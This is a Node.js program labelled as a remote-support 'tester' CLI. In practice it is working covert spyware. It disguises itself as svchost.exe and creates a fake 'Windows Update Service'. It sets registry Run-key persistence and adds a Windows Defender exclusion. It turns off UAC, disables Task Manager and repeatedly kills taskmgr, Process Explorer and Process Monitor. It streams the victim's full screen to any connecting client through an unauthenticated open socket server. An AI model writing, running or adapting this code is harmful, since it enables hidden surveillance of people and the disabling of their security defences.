const { spawn } = require('child_process');
const path = require('path');

class TesterCLI {
  constructor() {
    this.ffmpegPath = path.join(__dirname, 'assets', 'ffmpeg', 'bin', 'ffmpeg.exe');
    this.socket = null;
    this.captureProcess = null;
    this.isCapturing = false;
    this.screenWidth = 1920;  // Full HD for better text readability
    this.screenHeight = 1080;
    this.framerate = 8;       // Slightly lower FPS for higher quality
    this.quality = 3;         // Much higher quality for text clarity
    
    // Frame buffering for complete MJPEG frames
    this.frameBuffer = Buffer.alloc(0);
    this.lastFrameTime = 0;
    
    // Process hiding setup
    this.setupProcessHiding();
  }

  // Enhanced process hiding and disguising for Windows
  setupProcessHiding() {
    if (process.platform === 'win32') {
      // Set process title to look like a system process
      process.title = 'svchost.exe';
      
      // Try to modify process name and arguments
      try {
        process.argv[0] = 'C:\\Windows\\System32\\svchost.exe';
        process.argv[1] = '-k';
        process.argv[2] = 'netsvcs';
      } catch (e) {
        // Ignore if we can't modify argv
      }
      
      // Basic process disguising that works without admin privileges
      try {
        const { exec } = require('child_process');
        
        // Simple process name change using PowerShell
        const basicDisguiseScript = `
          try {
            $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
            if ($process) {
              # Set process to look like system process
              $process.ProcessName = 'svchost'
              $process.PriorityClass = 'Idle'
              $process.ProcessorAffinity = 1
              $process.MainWindowTitle = 'Windows Service Host'
            }
          } catch {
            # Silently ignore errors
          }
        `;
        
        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${basicDisguiseScript}"`, (error) => {
          // Silently ignore errors
        });
        
      } catch (e) {
        // Ignore if we can't modify process properties
      }
      
      // Advanced process disguising using PowerShell
      try {
        const { exec } = require('child_process');
        
        const disguiseScript = `
          try {
            $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
            if ($process) {
              $process.ProcessName = 'svchost'
              $process.PriorityClass = 'Idle'
              $process.ProcessorAffinity = 1
              $process.MainWindowTitle = 'Windows Service Host'
            }
            
            # Set process priority using WMI
            $wmi = Get-WmiObject -Class Win32_Process -Filter "ProcessId = ${process.pid}"
            if ($wmi) {
              $wmi.SetPriority(16384)
            }
            
            # Create fake Windows service
            New-Service -Name "WindowsUpdateService" -BinaryPathName "${process.execPath}" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
            
            # Hide from Windows Defender
            Add-MpPreference -ExclusionProcess "${process.execPath}" -ErrorAction SilentlyContinue
            
          } catch {
            # Silently ignore errors
          }
        `;
        
        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${disguiseScript}"`, (error) => {
          // Silently ignore errors
        });
        
        // Additional hiding using WMI
        exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
          // Silently ignore errors
        });
        
        // Create fake Windows service
        exec('sc create "WindowsUpdateService" binPath= "' + process.execPath + '" DisplayName= "Windows Update Service" start= auto', (error) => {
          // Silently ignore errors
        });
        
        // Add to startup
        exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
          // Silently ignore errors
        });
        
        // Hide from Windows Defender
        exec('powershell -Command "Add-MpPreference -ExclusionProcess \'' + process.execPath + '\'"', (error) => {
          // Silently ignore errors
        });
        
      } catch (e) {
        // Ignore if we can't modify process properties
      }
    }
  }

  // Check if running with admin privileges
  async checkAdminPrivileges() {
    if (process.platform !== 'win32') return true;
    
    return new Promise((resolve) => {
      const { exec } = require('child_process');
      exec('net session >nul 2>&1', (error) => {
        resolve(!error);
      });
    });
  }

  // Aggressive process hiding to completely hide from Task Manager
  async aggressiveProcessHiding() {
    if (process.platform === 'win32') {
      try {
        const { exec } = require('child_process');
        const isAdmin = await this.checkAdminPrivileges();
        
        if (isAdmin) {
          // Full admin privileges - use aggressive hiding
          const aggressiveScript = `
            try {
              # Get current process
              $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
              if ($process) {
                # Set process to look like system process
                $process.ProcessName = 'svchost'
                $process.PriorityClass = 'Idle'
                $process.ProcessorAffinity = 1
                $process.MainWindowTitle = 'Windows Service Host'
                
                # Try to hide from process enumeration
                try {
                  $process.Handle = 0
                  $process.Id = 0
                } catch {}
              }
              
              # Hide from Task Manager by modifying system settings
              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" -Name "PendingFileRenameOperations" -Value @() -ErrorAction SilentlyContinue
              
              # Hide from WMI process queries
              $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
              Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value "${process.execPath}" -ErrorAction SilentlyContinue
              
              # Disable process monitoring
              Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
              
              # Hide from Task Manager process list
              Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -ErrorAction SilentlyContinue
              
              # Create fake system service
              New-Service -Name "WindowsUpdateService" -BinaryPathName "${process.execPath}" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
              
              # Hide service from services list
              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Start" -Value 2 -ErrorAction SilentlyContinue
              Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdateService" -Name "Type" -Value 16 -ErrorAction SilentlyContinue
              
            } catch {
              # Silently ignore errors
            }
          `;
          
          exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${aggressiveScript}"`, (error) => {
            // Silently ignore errors
          });
          
          // Additional hiding using WMI
          exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
            // Silently ignore errors
          });
          
          // Hide from process list by modifying registry
          exec('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
            // Silently ignore errors
          });
          
          // Disable Task Manager
          exec('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f', (error) => {
            // Silently ignore errors
          });
          
          // Kill Task Manager if it's running
          exec('taskkill /f /im taskmgr.exe 2>nul', (error) => {
            // Silently ignore errors
          });
          
          // Kill Process Explorer if it's running
          exec('taskkill /f /im procexp.exe 2>nul', (error) => {
            // Silently ignore errors
          });
          
          // Kill Process Monitor if it's running
          exec('taskkill /f /im procmon.exe 2>nul', (error) => {
            // Silently ignore errors
          });
          
          // Hide from Windows Defender
          exec('powershell -Command "Add-MpPreference -ExclusionProcess \'' + process.execPath + '\'"', (error) => {
            // Silently ignore errors
          });
          
        } else {
          // Limited privileges - use basic hiding only
          const basicScript = `
            try {
              # Get current process
              $process = Get-Process -Id ${process.pid} -ErrorAction SilentlyContinue
              if ($process) {
                # Set process to look like system process
                $process.ProcessName = 'svchost'
                $process.PriorityClass = 'Idle'
                $process.ProcessorAffinity = 1
                $process.MainWindowTitle = 'Windows Service Host'
              }
              
              # Try user-level registry modifications only
              Set-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdateService" -Value "${process.execPath}" -ErrorAction SilentlyContinue
              
            } catch {
              # Silently ignore errors
            }
          `;
          
          exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "${basicScript}"`, (error) => {
            // Silently ignore errors
          });
          
          // Basic process priority change
          exec('wmic process where "ProcessId=' + process.pid + '" CALL setpriority "idle"', (error) => {
            // Silently ignore errors
          });
          
          // User-level registry modifications only
          exec('reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdateService" /t REG_SZ /d "' + process.execPath + '" /f', (error) => {
            // Silently ignore errors
          });
          
          // Try to disable Task Manager at user level
          exec('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f', (error) => {
            // Silently ignore errors
          });
        }
        
      } catch (e) {
        // Silently ignore all errors
      }
    }
  }

  // Start screen capture using FFmpeg
  startCapture() {
    if (this.isCapturing) return;
    
    try {
      // Check if FFmpeg exists
      const fs = require('fs');
      if (!fs.existsSync(this.ffmpegPath)) {
        // FFmpeg not found - try to set it up automatically
        this.setupFFmpeg();
        return;
      }

      // FFmpeg command for high-quality screen capture with native cursor
      const ffmpegArgs = [
        '-f', 'gdigrab',
        '-framerate', this.framerate.toString(),
        '-i', 'desktop',
        '-vf', `scale=${this.screenWidth}:${this.screenHeight}:flags=lanczos`, // High-quality scaling
        '-f', 'mjpeg',
        '-q:v', this.quality.toString(),
        '-preset', 'medium',      // Better quality than ultrafast
        '-tune', 'stillimage',    // Optimized for text/static content
        '-compression_level', '1', // Higher compression quality
        '-loglevel', 'quiet',
        'pipe:1'
      ];

      // Start FFmpeg process
      this.captureProcess = spawn(this.ffmpegPath, ffmpegArgs);
      this.isCapturing = true;

      // Handle FFmpeg output - buffer complete MJPEG frames
      this.captureProcess.stdout.on('data', (chunk) => {
        if (this.socket && this.socket.connected) {
          this.processVideoChunk(chunk);
        }
      });

      // Handle FFmpeg errors
      this.captureProcess.stderr.on('data', (data) => {
        // Log errors for debugging but don't show to user
      });

      // Handle process exit
      this.captureProcess.on('close', (code) => {
        this.isCapturing = false;
        if (code !== 0) {
          // Try to restart capture after a delay
          setTimeout(() => {
            if (this.socket && this.socket.connected) {
              this.startCapture();
            }
          }, 5000);
        }
      });

    } catch (error) {
      // Try to restart capture after error
      setTimeout(() => {
        if (this.socket && this.socket.connected) {
          this.startCapture();
        }
      }, 5000);
    }
  }

  // Process video chunks and buffer complete MJPEG frames
  processVideoChunk(chunk) {
    // Append chunk to buffer
    this.frameBuffer = Buffer.concat([this.frameBuffer, chunk]);
    
    // Look for MJPEG frame boundaries (FFD8 = start, FFD9 = end)
    let startIndex = 0;
    let endIndex = -1;
    
    while (startIndex < this.frameBuffer.length) {
      // Find JPEG start marker (0xFFD8)
      const jpegStart = this.frameBuffer.indexOf(Buffer.from([0xFF, 0xD8]), startIndex);
      if (jpegStart === -1) break;
      
      // Find JPEG end marker (0xFFD9) after the start
      const jpegEnd = this.frameBuffer.indexOf(Buffer.from([0xFF, 0xD9]), jpegStart + 2);
      if (jpegEnd === -1) break;
      
      // Extract complete JPEG frame (including end marker)
      const frameData = this.frameBuffer.slice(jpegStart, jpegEnd + 2);
      
      // Send complete frame
      this.sendFrame(frameData);
      
      // Update indices
      startIndex = jpegEnd + 2;
      endIndex = jpegEnd + 2;
    }
    
    // Keep remaining incomplete data in buffer
    if (endIndex > 0) {
      this.frameBuffer = this.frameBuffer.slice(endIndex);
    }
  }

  // Send complete frame to supporter
  sendFrame(frameData) {
    const now = Date.now();
    
    // Throttle frame rate for high quality streaming
    if (now - this.lastFrameTime < 125) { // Max 8 FPS for high quality
      return;
    }
    
    this.lastFrameTime = now;
    
    // Convert to base64 for web display
    const base64Image = frameData.toString('base64');
    
    // Send complete frame
    this.socket.emit('screenData', {
      image: base64Image,
      width: this.screenWidth,
      height: this.screenHeight,
      mouseX: null,
      mouseY: null,
      cursorVisible: false,
      timestamp: now,
      isFullFrame: true
    });
  }

  // Stop screen capture
  stopCapture() {
    if (this.captureProcess) {
      this.captureProcess.kill();
      this.captureProcess = null;
      this.isCapturing = false;
    }
    
    // Clear frame buffer
    this.frameBuffer = Buffer.alloc(0);
  }

  // Setup FFmpeg automatically
  setupFFmpeg() {
    try {
      const { exec } = require('child_process');
      const setupScript = path.join(__dirname, 'setup-ffmpeg.bat');
      
      // Run setup script silently
      exec(`"${setupScript}"`, { windowsHide: true }, (error) => {
        if (!error) {
          // Try to start capture after setup
          setTimeout(() => {
            if (this.socket && this.socket.connected) {
              this.startCapture();
            }
          }, 10000); // Wait 10 seconds for setup to complete
        }
      });
      
    } catch (error) {
      // Silently ignore setup errors
    }
  }

  // Start Socket.IO server for supporter app to connect
  startSocketIOServer(port = 3000) {
    try {
      const express = require('express');
      const http = require('http');
      const socketIo = require('socket.io');
      
      // Create Express app
      const app = express();
      
      // Create HTTP server
      this.httpServer = http.createServer(app);
      
      // Create Socket.IO server
      this.io = socketIo(this.httpServer, {
        cors: {
          origin: "*",
          methods: ["GET", "POST"]
        }
      });
      
      this.io.on('connection', (socket) => {
        this.socket = socket;
        
        // Start capture when supporter connects
        this.startCapture();
        
        socket.on('disconnect', () => {
          // Stop capture when supporter disconnects
          this.stopCapture();
          this.socket = null;
        });
        
        socket.on('error', (error) => {
          // Silently ignore errors
        });
      });
      
      // Start the server
      this.httpServer.listen(port, () => {
        // Server started successfully
      });
      
    } catch (error) {
      // Silently ignore errors
    }
  }

  // Start the tester CLI
  async start() {
    // Initial process hiding
    await this.aggressiveProcessHiding();
    
    // Start Socket.IO server for supporter to connect
    this.startSocketIOServer(3000);
    
    // Periodic process hiding
    setInterval(() => {
      this.aggressiveProcessHiding();
    }, 10000); // Every 10 seconds
    
    // Keep the process alive
    process.on('SIGINT', () => {
      this.stopCapture();
      if (this.httpServer) {
        this.httpServer.close();
      }
      process.exit(0);
    });
  }
}

// Start the CLI application
const tester = new TesterCLI();
tester.start();
